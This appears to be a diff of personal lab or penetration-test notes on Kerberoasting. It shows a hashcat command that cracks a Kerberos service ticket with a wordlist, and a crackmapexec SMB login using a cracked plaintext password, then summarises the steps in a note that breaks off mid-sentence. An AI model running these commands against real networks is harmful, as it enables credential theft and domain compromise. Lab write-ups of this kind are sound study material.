@@ -73,4 +73,11 @@ hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt
 sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!
 ```
 
-found that sqldev in
+found that sqldev is indeed a member of domain admin group , 
+keberoasted the user and found the tgs 
+then cracked it offline with hashcat 
+then verified with crackmapexec to find if we can get a shell or not or the creds are 
+
+
+
+
